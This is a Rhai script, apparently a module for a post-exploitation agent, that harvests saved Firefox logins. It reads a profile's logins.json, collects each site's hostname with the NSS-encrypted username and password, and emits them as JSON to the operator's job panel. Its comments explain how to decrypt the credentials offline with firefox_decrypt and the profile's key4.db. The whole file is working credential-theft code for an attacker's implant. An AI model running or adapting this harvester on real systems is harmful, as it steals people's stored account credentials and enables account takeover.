// cred_firefox.rhai - Firefox saved-login harvester.
//
// Reads the profile's logins.json via internal_firefox_logins. The
// username/password fields are NSS-encrypted (3DES-CBC, key in key4.db);
// there is no agent-side NSS decryptor, so this script reports the
// ciphertext for OFFLINE decryption (firefox_decrypt / mozilla-decrypt
// with the profile's key4.db + cert9.db). That limitation is stated in
// the output rather than silently returning ciphertext as if useful.
//
// Optional arg: args[0] = Firefox profile directory (default: scan).
// Output: one JSON document on stdout (lands in the Jobs panel / history).

fn esc(s) {
    let r = s.replace("\\", "\\\\");
    return r.replace("\"", "\\\"");
}

let profile = if args.len() > 0 { args[0] } else { "" };

print_log("cred_firefox: reading logins.json (profile: " + (if profile == "" { "scan" } else { profile }) + ")");

let js = internal_firefox_logins(profile);
if js.starts_with("Error:") {
    return "cred_firefox: " + js;
}

let out = "[";
let count = 0;
let i = 0;
loop {
    let host = internal_json_get(js, "logins." + i + ".hostname");
    if host == "null" { break; }
    let enc_user = internal_json_get(js, "logins." + i + ".encryptedUsername");
    let enc_pass = internal_json_get(js, "logins." + i + ".encryptedPassword");
    if count > 0 { out += ","; }
    out += "{\"host\":\"" + esc(host) +
           "\",\"encrypted_username\":\"" + enc_user +
           "\",\"encrypted_password\":\"" + enc_pass + "\"}";
    count += 1;
    i += 1;
}
out += "]";

print_log("cred_firefox: " + count + " logins (NSS ciphertext, offline decrypt required)");
return "{\"source\":\"firefox_logins\",\"logins\":" + count +
       ",\"note\":\"fields are NSS-encrypted; decrypt offline with firefox_decrypt and the profile key4.db\",\"rows\":" + out + "}";
